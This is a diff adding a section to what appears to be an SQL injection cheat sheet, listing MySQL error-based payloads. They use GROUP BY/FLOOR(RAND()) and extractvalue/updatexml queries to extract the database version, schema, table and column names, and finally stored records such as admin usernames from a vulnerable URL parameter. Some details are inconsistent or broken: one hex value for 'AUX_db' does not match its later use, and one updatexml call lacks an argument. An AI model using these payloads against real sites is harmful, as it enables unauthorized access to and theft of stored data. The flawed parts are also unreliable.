@@ -573,3 +573,92 @@ This one is the easiest of all SQLi attacks.
 >   - `0x64617461626173652829 == database()`
 
 ---
+
+
+## WorkAround when UNION Queries doesn't work (MySQL Error Based SQLi)
+
+- Method No. 1:
+> - Retrieving database version directly:
+> ```sql
+> +OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-
+> ```
+> - Example:
+> ```sql
+> https://www.example.com/index.php?id=1' +OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1--+-
+> ```
+
+> - Retrieving database name:
+> ```sql
+> +AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+> ```
+
+> - Retrieving Tables:
+> ```sql
+> +AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x7461626c655f6e616d65+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+> ```
+> - Where:
+>   - `0x7461626c655f6e616d65 == table_name`
+> - Modify the value of `LIMIT+0,1` acordingly to be able to retrive required table names
+>
+
+> - Retrieving Columns
+>   - Convert the value of database name, table name(s) to 0xHEX. Suppose:
+> ```
+> litoflex -> 0x6c69746f666c6578  
+> username -> 0x757365726e616d65
+> ```
+> - Then:
+> ```sql
+> +AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x757365726e616d65+AND+table_schema=0x6c69746f666c6578+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)-- -
+> ```
+> - Modify the value of `LIMIT+0,1` accordingly to be able to retrive different columns
+
+- Method No. 2: using XPATH queries
+> - Retrieving database version:
+> ```sql
+> and extractvalue(0x0a,concat(0x0a,(select version())))-- -
+> ```
+> ```sql
+> and updatexml(null,concat(0x0a,(select version())),null)-- -
+> ```
+
+> - Retrieving database name:
+> ```sql
+> and extractvalue(0x0a,concat(0x0a,(select database())))-- -
+> ```
+> ```sql
+> and updatexml(null,concat(0x0a,(select database())),null)-- -
+> ```
+
+> - Retrieving tables
+> ```sql
+> and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))-- -
+> ```
+> ```sql
+> and updatexml(null,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),null)-- -
+> ```
+> - Modify the value of `limit 0,1` accordingly to be able to retrieve required table
+
+> - Retrieving Columns
+>   - Convert database and table name into 0xHEX value
+> ```
+> database: AUX_db -> 0xa4155585f6462
+> table: AUX_column1 -> 0x4155585f636f6c756d6e31
+> ```
+> ```sql
+> and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)))-- -
+> ```
+> ```sql
+> and updatexml(null,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x4155585f6462 and table_name=0x4155585f636f6c756d6e31 limit 0,1)),null)-- -
+> ```
+
+> - Retrieving data inside columns
+>   - Suppose we retrieved `admin_username` from previous queries then:
+> ```sql
+> and extractvalue(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))
+> ```
+> ```sql
+> and updatexml(0x0a,concat(0x0a,(select concat(admin_username) from AUX_db.AUX_column1 limit 0,1)))
+> ```
+
+---
